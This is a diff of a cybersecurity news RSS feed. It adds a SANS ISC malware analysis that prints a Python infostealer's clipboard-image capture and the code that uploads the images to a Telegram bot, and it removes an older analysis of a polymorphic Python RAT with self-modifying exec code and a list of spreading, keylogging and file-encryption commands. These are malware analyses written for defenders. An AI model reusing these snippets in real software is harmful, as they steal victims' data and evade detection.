@@ -1,5 +1,55 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Wed, 15 Oct 2025 04:59:27 +0000</lastBuildDate><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>ISC Stormcast For Wednesday, October 15th, 2025 https://isc.sans.edu/podcastdetail/9656</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>Upcoming Speaking Engagements</title><link>https://www.schneier.com/blog/archives/2025/10/upcoming-speaking-engagements-49.html</link><description>&lt;p&gt;This is a current list of where and when I am scheduled to speak:&lt;/p&gt;
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Wed, 15 Oct 2025 05:59:18 +0000</lastBuildDate><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>Clipboard Pictures Exfiltration in Python Infostealer</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>Clipboard Pictures Exfiltration in Python Infostealer, (Wed, Oct 15th)</title><link>https://isc.sans.edu/diary/rss/32372</link><description>&lt;p&gt;For a while, clipboard content has been monitored by many infostealers. Purposes can be multiple, like simply searching and exfiltrating juicy data or on-the-fly modification like crypto-wallet swapping&amp;&amp;#x23&amp;#x3b;x26&amp;#x3b;&amp;#x23&amp;#x3b;x5b&amp;#x3b;&lt;a href="https://isc.sans.edu/diary/MultiCryptocurrency&amp;amp;&amp;amp;#x23&amp;#x3b;x26&amp;#x3b;&amp;amp;#x23&amp;#x3b;x2b&amp;#x3b;Clipboard&amp;amp;&amp;amp;#x23&amp;#x3b;x26&amp;#x3b;&amp;amp;#x23&amp;#x3b;x2b&amp;#x3b;Swapper/28574"&gt;1&lt;/a&gt;&amp;&amp;#x23&amp;#x3b;x26&amp;#x3b;&amp;#x23&amp;#x3b;x5d&amp;#x3b;. Note that the clipboard is a major risk when you don&amp;&amp;#x23&amp;#x3b;x26&amp;#x3b;&amp;#x23&amp;#x3b;39&amp;#x3b;t disable clipboard sharing between your virtual machines and hosts. A malware running in a sandbox will access your (host) clipboard without problem&amp;#x21;&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;For a while, clipboard content has been monitored by many infostealers. Purposes can be multiple, like simply searching and exfiltrating juicy data or on-the-fly modification like crypto-wallet swapping[&lt;a href="https://isc.sans.edu/diary/MultiCryptocurrency+Clipboard+Swapper/28574"&gt;1&lt;/a&gt;]. Note that the clipboard is a major risk when you don't disable clipboard sharing between your virtual machines and hosts. A malware running in a sandbox will access your (host) clipboard without problem!&lt;/p&gt;
+
+&lt;p&gt;The clipboard does not only carry text. Today, we use the clipboard to manipulate a lot of &amp;quot;binary data&amp;quot;. After plain text, the most common data types are pictures! We take pictures every time and share them through the clipboard! Who has never grabbed pieces of screens like this? This is convenient when writing reports, documentation, or for archiving purposes.&lt;/p&gt;
+
+&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/isc-20251015-1.png" style="width: 600px; height: 440px;" /&gt;&lt;/p&gt;
+
+&lt;p&gt;I spotted a Python infostealer that pays attention to pictures exchanged with the clipboard. It's pretty easy to implement because the ImageGrab library has this feature built in [&lt;a href="https://pillow.readthedocs.io/en/stable/reference/ImageGrab.html#PIL.ImageGrab.grabclipboard"&gt;2&lt;/a&gt;]. Here is the piece of code implemented in the malware:&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+img = ImageGrab.grabclipboard()
+if isinstance(img, Image.Image):
+    img_bytes = io.BytesIO()
+    img.save(img_bytes, format='PNG')
+    img_hash = hashlib.md5(img_bytes.getvalue()).hexdigest()
+    if img_hash != prev_clip_img_hash:
+        img_path = &amp;quot;clipboard_img.png&amp;quot;
+        img.save(img_path, &amp;quot;PNG&amp;quot;)
+        send_image(img_path)
+        prev_clip_img_hash = img_hash&lt;/pre&gt;
+
+&lt;p&gt;Telegram is used for C2 communications:&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+def send_image(image_path):
+    if not bot_active or not os.path.exists(image_path):
+        logging.warning(f&amp;quot;[send_image] T?p kh&amp;ocirc;ng t?n t?i: {image_path}&amp;quot;)
+        return
+    try:
+        with open(image_path, &amp;quot;rb&amp;quot;) as photo:
+            url = f&amp;quot;https://api.telegram.org/bot{TOKEN}/sendDocument&amp;quot;
+            files = {&amp;quot;document&amp;quot;: photo}
+            data = {&amp;quot;chat_id&amp;quot;: CHAT_ID}
+            response = requests.post(url, files=files, data=data)
+            if response.status_code != 200:
+                logging.error(f&amp;quot;[send_image] L?i g?i ?nh: {response.text}&amp;quot;)
+    except Exception as e:
+        logging.error(f&amp;quot;[send_image] G?i ?nh l?i: {e}&amp;quot;)&lt;/pre&gt;
+
+&lt;p&gt;Note the presence of Vietnamese text (&amp;quot;T?p kh&amp;ocirc;ng t?n t?i&amp;quot; means &amp;quot;File not found&amp;quot;). The file (SHA256:7c70f53ff1e05ee104403784f42819adb1e445c9d97b82cff72a986d59619959) has a low VT score (5/64)[&lt;a href="https://www.virustotal.com/gui/file/7c70f53ff1e05ee104403784f42819adb1e445c9d97b82cff72a986d59619959/detection"&gt;3&lt;/a&gt;].&lt;/p&gt;
+
+&lt;p&gt;[1] &lt;a href="https://isc.sans.edu/diary/MultiCryptocurrency+Clipboard+Swapper/28574"&gt;https://isc.sans.edu/diary/MultiCryptocurrency+Clipboard+Swapper/28574&lt;/a&gt;&lt;br /&gt;
+[2] &lt;a href="https://pillow.readthedocs.io/en/stable/reference/ImageGrab.html#PIL.ImageGrab.grabclipboard"&gt;https://pillow.readthedocs.io/en/stable/reference/ImageGrab.html#PIL.ImageGrab.grabclipboard&lt;/a&gt;&lt;br /&gt;
+[3] &lt;a href="https://www.virustotal.com/gui/file/7c70f53ff1e05ee104403784f42819adb1e445c9d97b82cff72a986d59619959/detection"&gt;https://www.virustotal.com/gui/file/7c70f53ff1e05ee104403784f42819adb1e445c9d97b82cff72a986d59619959/detection&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Xavier Mertens (@xme)&lt;br /&gt;
+Xameco&lt;br /&gt;
+Senior ISC Handler - Freelance Cyber Security Consultant&lt;br /&gt;
+&lt;a href="https://keybase.io/xme/key.asc"&gt;PGP Key&lt;/a&gt;&lt;/p&gt;
+
+ 
+ (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/32372</guid></item><item><title>Upcoming Speaking Engagements</title><link>https://www.schneier.com/blog/archives/2025/10/upcoming-speaking-engagements-49.html</link><description>&lt;p&gt;This is a current list of where and when I am scheduled to speak:&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;Nathan E. Sanders and I will be giving a &lt;a href="https://ash.harvard.edu/events/in-person-book-talk-rewiring-democracy-how-ai-will-transform-our-politics-government-and-citizenship/"&gt;book talk&lt;/a&gt; on &lt;em&gt;Rewiring Democracy&lt;/em&gt; at the Harvard Kennedy School’s Ash Center in Cambridge, Massachusetts, USA, on October 22, 2025, at noon ET.&lt;/li&gt;
 &lt;li&gt;Nathan E. Sanders and I will be speaking and signing books at the &lt;a href="https://www.harvard.com/event/schneier-sanders"&gt;Cambridge Public Library&lt;/a&gt; in Cambridge, Massachusetts, USA, on October 22, 2025, at 6:00 PM ET. The event is sponsored by Harvard Bookstore.&lt;/li&gt;
@@ -2995,7 +3045,7 @@ Senior handler&lt;br /&gt;
 
 
 &lt;div class="wp-block-embed__wrapper"&gt;
-			&lt;div class="ms-metrics-youtube-container" id="ms-metrics-youtube-68ef13e45fe46"&gt;
+			&lt;div class="ms-metrics-youtube-container" id="ms-metrics-youtube-68ef232078dd9"&gt;
 				&lt;div class="ms-metrics-youtube-player"&gt;&lt;/div&gt;
 			&lt;/div&gt;
 		&lt;/div&gt;
@@ -4399,169 +4449,7 @@ Handler&lt;/p&gt;
 &lt;p&gt;The post &lt;a href="https://www.techrepublic.com/article/news-qualcomm-acquires-arduino/"&gt;Qualcomm to Acquire Arduino for Robotics and AI Development&lt;/a&gt; appeared first on &lt;a href="https://www.techrepublic.com"&gt;TechRepublic&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4330493</guid><category>Artificial Intelligence</category><category>News</category></item><item><title>Dash0 Raises $35M to Advance AI-native Observability</title><link>https://www.techrepublic.com/article/news-dash0-series-a-ai-observability/</link><description>&lt;p&gt;Dash0 raised $35 million in Series A funding to expand its AI-native observability platform, Agent0, which aims to automate system monitoring and troubleshooting.&lt;/p&gt;
 &lt;p&gt;The post &lt;a href="https://www.techrepublic.com/article/news-dash0-series-a-ai-observability/"&gt;Dash0 Raises $35M to Advance AI-native Observability&lt;/a&gt; appeared first on &lt;a href="https://www.techrepublic.com"&gt;TechRepublic&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4330488</guid><category>Artificial Intelligence</category><category>DevOps</category><category>News</category></item><item><title>Google Extends Opal to More Countries After Surge of Creative AI Apps</title><link>https://www.techrepublic.com/article/news-google-expands-opal/</link><description>&lt;p&gt;Google rolls out Opal to 15 countries with faster performance, parallel workflows, and real-time debugging to put no-code AI app creation into more hands.&lt;/p&gt;
 &lt;p&gt;The post &lt;a href="https://www.techrepublic.com/article/news-google-expands-opal/"&gt;Google Extends Opal to More Countries After Surge of Creative AI Apps&lt;/a&gt; appeared first on &lt;a href="https://www.techrepublic.com"&gt;TechRepublic&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4330463</guid><category>Artificial Intelligence</category><category>Google</category><category>News</category></item><item><title>Coupa Seeks Supply Chain Success with Scoutbee Acquisition</title><link>https://www.techrepublic.com/article/coupa-scoutbee-acquisition/</link><description>&lt;p&gt;Although financial terms were not disclosed, the deal unites Coupa’s network of over ten million buyers and suppliers with Scoutbee’s AI capabilities.&lt;/p&gt;
-&lt;p&gt;The post &lt;a href="https://www.techrepublic.com/article/coupa-scoutbee-acquisition/"&gt;Coupa Seeks Supply Chain Success with Scoutbee Acquisition&lt;/a&gt; appeared first on &lt;a href="https://www.techrepublic.com"&gt;TechRepublic&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4330295</guid><category>Artificial Intelligence</category><category>News</category><category>ai</category><category>Coupa</category><category>Scoutbee</category><category>supply chain</category></item><item><title>Polymorphic Python Malware, (Wed, Oct 8th)</title><link>https://isc.sans.edu/diary/rss/32354</link><description>&lt;p&gt;Today, I spoted on VirusTotal an interesting Python RAT. They are tons of them but this one attracted my attention based on some function names present in the code: self&amp;#x5f;modifying&amp;#x5f;wrapper(), decrypt&amp;#x5f;and&amp;#x5f;execute() and polymorph&amp;#x5f;code(). A polymorphic malware is a type of malware that has been developed to repeatedly mutate its appearance or signature files at every execution time. The file got a very low score of 2/64 on VT&amp;#x21; (SHA256:7173e20e7ec217f6a1591f1fc9be6d0a4496d78615cc5ccdf7b9a3a37e3ecc3c).&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;Today, I spoted on VirusTotal an interesting Python RAT. They are tons of them but this one attracted my attention based on some function names present in the code: self_modifying_wrapper(), decrypt_and_execute() and&amp;nbsp;polymorph_code(). A polymorphic malware is a type of malware that has been developed to repeatedly mutate its appearance or signature files at every execution time. The file got a very low score of 2/64 on VT! (SHA256:7173e20e7ec217f6a1591f1fc9be6d0a4496d78615cc5ccdf7b9a3a37e3ecc3c).&lt;/p&gt;
-
-&lt;p&gt;To be able to modify its code on the fly, the program must have access to its own source code. Many languages have this capability. I covered the same technque in JavaScript a long time ago[&lt;a href="https://isc.sans.edu/diary/AntiDebugging+JavaScript+Techniques/26228"&gt;1&lt;/a&gt;]. With Python, there is a very interesting module that can add the same capability: inspect[&lt;a href="https://docs.python.org/3/library/inspect.html"&gt;2&lt;/a&gt;].&lt;/p&gt;
-
-&lt;p&gt;Here is a simple snippet of code to demonstrate how it works:&lt;/p&gt;
-
-&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
-remnux@remnux:~$ cat poc.py
-import inspect
-
-def dummy_function():
-    print(&amp;quot;I'm a dummy function!&amp;quot;)
-
-def main():
-    print(&amp;quot;Function code:&amp;quot;)
-    print(inspect.getsource(dummy_function))
-
-if __name__ == &amp;quot;__main__&amp;quot;:
-    main()
-
-remnux@remnux:~$ python3 poc.py
-Function code:
-def dummy_function():
-    print(&amp;quot;I'm a dummy function!&amp;quot;)&lt;/pre&gt;
-
-&lt;p&gt;Once you get the source code, you can perform plenty of actions like anti-tampering detection (was the code modified - to debug it) or obfuscate it.&lt;/p&gt;
-
-&lt;p&gt;In the discovered sample, the self_modifying_wrapper() function will grab a function code, XOR it with a random key then un-XOR it and execute it from memory:&lt;/p&gt;
-
-&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
-# Self-modifying code wrapper (simulates packing)
-def self_modifying_wrapper():
-    &amp;quot;&amp;quot;&amp;quot;Wrap critical code in a self-modifying layer.&amp;quot;&amp;quot;&amp;quot;
-    log_path = resource_path('debug.log')
-    try:
-        # Simulate packed code by XORing critical sections
-        critical_code = inspect.getsource(main).encode()
-        xor_key = random.randint(1, 255)
-        packed_code = bytes(b ^ xor_key for b in critical_code)
-        # Unpack at runtime
-        unpacked_code = bytes(b ^ xor_key for b in packed_code)
-        code_obj = marshal.loads(zlib.decompress(unpacked_code))
-        exec(code_obj)
-        with open(log_path, &amp;quot;a&amp;quot;) as f:
-            f.write(&amp;quot;[+] Self-modifying code executed\n&amp;quot;)
-        return True
-    except Exception as e:
-        with open(log_path, &amp;quot;a&amp;quot;) as f:
-            f.write(f&amp;quot;[-] Self-modifying code failed: {e}\n&amp;quot;)
-        return False
-&lt;/pre&gt;
-
-&lt;p&gt;The malware has also the capability to&amp;nbsp;inject&amp;nbsp;junk code:&lt;/p&gt;
-
-&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
-def polymorph_code(code):
-    &amp;quot;&amp;quot;&amp;quot;Obfuscate code with advanced randomization and junk code.&amp;quot;&amp;quot;&amp;quot;
-    log_path = resource_path('debug.log')
-    try:
-        # Advanced variable renaming
-        var_map = {var: ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(8, 12))) for var in code.split() if var.isidentifier()}
-        for old_var, new_var in var_map.items():
-            code = code.replace(old_var, new_var)
-        # Insert complex junk code
-        junk_snippets = [
-            &amp;quot;def _unused_{}(): return None\n&amp;quot;.format(''.join(random.choice(string.ascii_letters) for _ in range(8))),
-            &amp;quot;x = [0] * {}; x = [y for y in x]\n&amp;quot;.format(random.randint(10, 100)),
-            &amp;quot;import time; time.sleep({})\n&amp;quot;.format(random.uniform(0.01, 0.1)),
-            &amp;quot;try: pass\nexcept: pass\n&amp;quot;
-        ]
-        lines = code.split('\n')
-        for _ in range(random.randint(10, 20)):
-            lines.insert(random.randint(0, len(lines)), random.choice(junk_snippets))
-        code = '\n'.join(lines)
-        # Shuffle function order
-        code = code.replace('\r\n', '\n')  # Normalize line endings
-        functions = re.findall(r'(def .+?\n\s*return .+?\n)', code, re.DOTALL)
-        if functions:
-            random.shuffle(functions)
-            code = code.replace(''.join(functions), ''.join(functions))
-        with open(log_path, &amp;quot;a&amp;quot;) as f:
-            f.write(&amp;quot;[+] Advanced polymorphic transformation applied\n&amp;quot;)
-        return code
-    except Exception as e:
-        with open(log_path, &amp;quot;a&amp;quot;) as f:
-            f.write(f&amp;quot;[-] Polymorphic transformation failed: {e}\n&amp;quot;)
-        return code
-        
-It's easy to get a nice overview of the RAT capabilities:&lt;/pre&gt;
-
-&lt;p&gt;Besides this specificity, the malware is a classic one and offers plenty of features to the Attacker. Here is a list of interesting functions that give a good overview of the capabilities:&lt;/p&gt;
-
-&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
-remnux@remnux:~$ grep &amp;quot;async def&amp;quot; 7173e20e7ec217f6a1591f1fc9be6d0a4496d78615cc5ccdf7b9a3a37e3ecc3c
-async def socket_network_scan():
-async def scan_host(ip):
-async def try_router_hack(ip):
-async def test_default_credentials(ip, service, port):
-async def deliver_payload(ip, share=None, service=None, port=None):
-async def execute_payload(ip, target_path, service):
-async def get_phone_number(stolen_data):
-async def send_stolen_data(stolen_data, channel, logins_path):
-async def spread_to_network():
-async def report_spreading_status(ip, message):
-async def xworm(ctx, spread_url=&amp;quot;https://example.com/serial_spoofer.exe&amp;quot;):
-async def record_screen_webcam(voice_channel, ctx):
-async def on_ready():
-async def commands(ctx):
-async def encrypt(ctx):
-async def mine(ctx):
-async def screenshot(ctx):
-async def audio(ctx):
-async def listen(ctx):
-async def execute(ctx, *, command):
-async def upload(ctx):
-async def download(ctx, *, filename):
-async def xworm(ctx):
-async def archive(ctx):
-async def system_info(ctx):
-async def run(ctx, *, program):
-&lt;/pre&gt;
-
-&lt;p&gt;In the same way, here is the list of bot commands:&lt;/p&gt;
-
-&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
-# Bot command: Show available commands
-@bot.command()
-async def commands(ctx):
-    log_path = resource_path('debug.log')
-    with open(log_path, &amp;quot;a&amp;quot;) as f:
-        f.write(&amp;quot;[+] Sending command list\n&amp;quot;)
-    commands_list = &amp;quot;&amp;quot;&amp;quot;
-    /commands - Show this help message
-    /encrypt - Encrypt victim's files
-    /mine - Start cryptominer (simulated)
-    /screenshot - Capture screenshot
-    /audio - Capture audio
-    /listen - Record screen for 30 seconds, stream high-quality live audio to voice channel
-    /execute &amp;lt;command&amp;gt; - Run shell command
-    /upload - Upload attached file to victim's PC
-    /download &amp;lt;filename&amp;gt; - Search and send file from victim's PC
-    /xworm - Deploy Xworm payload
-    /archive - Archive critical files
-    /keylog_start - Start keylogger
-    /keylog_stop - Stop keylogger and send log
-    /system_info - Get system information
-    /run &amp;lt;program&amp;gt; - Run a program
-    &amp;quot;&amp;quot;&amp;quot;
-    await ctx.send(commands_list)&lt;/pre&gt;
-
-&lt;p&gt;The file was uploaded on VT as&amp;nbsp;&amp;quot;nirorat.py&amp;quot;. I did not find any reference to this RAT. If you have more details, let us know!&lt;/p&gt;
-
-&lt;p&gt;[1] &lt;a href="https://isc.sans.edu/diary/AntiDebugging+JavaScript+Techniques/26228"&gt;https://isc.sans.edu/diary/AntiDebugging+JavaScript+Techniques/26228&lt;/a&gt;&lt;br /&gt;
-[2] &lt;a href="https://docs.python.org/3/library/inspect.html"&gt;https://docs.python.org/3/library/inspect.html&lt;/a&gt;&lt;br /&gt;
-&amp;nbsp;&lt;/p&gt;
-
-&lt;p&gt;Xavier Mertens (@xme)&lt;br /&gt;
-Xameco&lt;br /&gt;
-Senior ISC Handler - Freelance Cyber Security Consultant&lt;br /&gt;
-&lt;a href="https://keybase.io/xme/key.asc"&gt;PGP Key&lt;/a&gt;&lt;/p&gt;
-
- 
- (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/32354</guid></item><item><title>How Your AI Chatbot Can Become a Backdoor</title><link>https://www.trendmicro.com/en_us/research/25/j/ai-chatbot-backdoor.html</link><description>In this post of THE AI BREACH, learn how your Chatbot can become a backdoor.</description><guid isPermaLink="false">urn:uuid:97454f67-8171-b22c-1988-f62cc7305278</guid><category>Trend Micro Research : Artificial Intelligence (AI)</category><category>Trend Micro Research : Exploits &amp; Vulnerabilities</category><category>Trend Micro Research : Research</category><category>Trend Micro Research : Articles, News, Reports</category></item><item><title>A Cascade of Insecure Architectures: Axis Plugin Design Flaw Expose Select Autodesk Revit Users to Supply Chain Risk</title><link>https://www.trendmicro.com/en_us/research/25/j/axis-plugin-flaw-autodesk-revit-supply-chain-risk.html</link><description>We discovered Azure Storage Account credentials exposed in Axis Communications’ Autodesk Revit plugin, allowing unauthorized modification of cloud-hosted files. This exposure, combined with vulnerabilities in Autodesk Revit, could enable supply-chain attacks targeting end users.</description><guid isPermaLink="false">urn:uuid:a98a4d60-69fa-35c3-8716-3039416f0ec5</guid><category>Trend Micro Research : Cloud</category><category>Trend Micro Research : Articles, News, Reports</category><category>Trend Micro Research : Exploits &amp; Vulnerabilities</category></item><item><title>ShinyHunters Wage Broad Corporate Extortion Spree</title><link>https://krebsonsecurity.com/2025/10/shinyhunters-wage-broad-corporate-extortion-spree/</link><description>A cybercriminal group that used voice phishing attacks to siphon more than a billion records from Salesforce customers earlier this year has launched a website that threatens to publish data stolen from dozens of Fortune 500 firms if they refuse to pay a ransom. The group also claimed responsibility for a recent breach involving Discord user data, and for stealing terabytes of sensitive files from thousands of customers of the enterprise software maker Red Hat.</description><content:encoded>&lt;p&gt;A cybercriminal group that used voice phishing attacks to siphon more than a billion records from &lt;strong&gt;Salesforce&lt;/strong&gt; customers earlier this year has launched a website that threatens to publish data stolen from dozens of Fortune 500 firms if they refuse to pay a ransom. The group also claimed responsibility for a recent breach involving &lt;strong&gt;Discord&lt;/strong&gt; user data, and for stealing terabytes of sensitive files from thousands of customers of the enterprise software maker &lt;strong&gt;Red Hat&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;The post &lt;a href="https://www.techrepublic.com/article/coupa-scoutbee-acquisition/"&gt;Coupa Seeks Supply Chain Success with Scoutbee Acquisition&lt;/a&gt; appeared first on &lt;a href="https://www.techrepublic.com"&gt;TechRepublic&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4330295</guid><category>Artificial Intelligence</category><category>News</category><category>ai</category><category>Coupa</category><category>Scoutbee</category><category>supply chain</category></item><item><title>How Your AI Chatbot Can Become a Backdoor</title><link>https://www.trendmicro.com/en_us/research/25/j/ai-chatbot-backdoor.html</link><description>In this post of THE AI BREACH, learn how your Chatbot can become a backdoor.</description><guid isPermaLink="false">urn:uuid:97454f67-8171-b22c-1988-f62cc7305278</guid><category>Trend Micro Research : Artificial Intelligence (AI)</category><category>Trend Micro Research : Exploits &amp; Vulnerabilities</category><category>Trend Micro Research : Research</category><category>Trend Micro Research : Articles, News, Reports</category></item><item><title>A Cascade of Insecure Architectures: Axis Plugin Design Flaw Expose Select Autodesk Revit Users to Supply Chain Risk</title><link>https://www.trendmicro.com/en_us/research/25/j/axis-plugin-flaw-autodesk-revit-supply-chain-risk.html</link><description>We discovered Azure Storage Account credentials exposed in Axis Communications’ Autodesk Revit plugin, allowing unauthorized modification of cloud-hosted files. This exposure, combined with vulnerabilities in Autodesk Revit, could enable supply-chain attacks targeting end users.</description><guid isPermaLink="false">urn:uuid:a98a4d60-69fa-35c3-8716-3039416f0ec5</guid><category>Trend Micro Research : Cloud</category><category>Trend Micro Research : Articles, News, Reports</category><category>Trend Micro Research : Exploits &amp; Vulnerabilities</category></item><item><title>ShinyHunters Wage Broad Corporate Extortion Spree</title><link>https://krebsonsecurity.com/2025/10/shinyhunters-wage-broad-corporate-extortion-spree/</link><description>A cybercriminal group that used voice phishing attacks to siphon more than a billion records from Salesforce customers earlier this year has launched a website that threatens to publish data stolen from dozens of Fortune 500 firms if they refuse to pay a ransom. The group also claimed responsibility for a recent breach involving Discord user data, and for stealing terabytes of sensitive files from thousands of customers of the enterprise software maker Red Hat.</description><content:encoded>&lt;p&gt;A cybercriminal group that used voice phishing attacks to siphon more than a billion records from &lt;strong&gt;Salesforce&lt;/strong&gt; customers earlier this year has launched a website that threatens to publish data stolen from dozens of Fortune 500 firms if they refuse to pay a ransom. The group also claimed responsibility for a recent breach involving &lt;strong&gt;Discord&lt;/strong&gt; user data, and for stealing terabytes of sensitive files from thousands of customers of the enterprise software maker &lt;strong&gt;Red Hat&lt;/strong&gt;.&lt;/p&gt;
 &lt;div class="wp-caption aligncenter" id="attachment_72275" style="width: 1285px;"&gt;&lt;img alt="" class="size-full wp-image-72275" height="879" src="https://krebsonsecurity.com/wp-content/uploads/2025/10/sf-extortionsite.png" width="1275" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-72275"&gt;The new extortion website tied to ShinyHunters (UNC6040), which threatens to publish stolen data unless Salesforce or individual victim companies agree to pay a ransom.&lt;/p&gt;&lt;/div&gt;
 &lt;p&gt;In May 2025, a prolific and amorphous English-speaking cybercrime group known as &lt;strong&gt;ShinyHunters&lt;/strong&gt; launched a social engineering campaign that used voice phishing to trick targets into connecting a malicious app to their organization&amp;#8217;s Salesforce portal.&lt;/p&gt;
 &lt;p&gt;The first real details about the incident came in early June, when the &lt;strong&gt;Google Threat Intelligence Group &lt;/strong&gt;(GTIG) &lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/voice-phishing-data-extortion" rel="noopener" target="_blank"&gt;warned&lt;/a&gt; that ShinyHunters &amp;#8212; tracked by Google as &lt;strong&gt;UNC6040 &lt;/strong&gt;&amp;#8212; was extorting victims over their stolen Salesforce data, and that the group was poised to launch a data leak site to publicly shame victim companies into paying a ransom to keep their records private. A month later, Google acknowledged that one of its own corporate Salesforce instances was impacted in the voice phishing campaign.&lt;/p&gt;
@@ -5745,7 +5633,7 @@ OfficeActivity
 
 
 &lt;div class="wp-block-embed__wrapper"&gt;
-			&lt;div class="ms-metrics-youtube-container" id="ms-metrics-youtube-68ef13e47cba7"&gt;
+			&lt;div class="ms-metrics-youtube-container" id="ms-metrics-youtube-68ef232099304"&gt;
 				&lt;div class="ms-metrics-youtube-player"&gt;&lt;/div&gt;
 			&lt;/div&gt;
 		&lt;/div&gt;
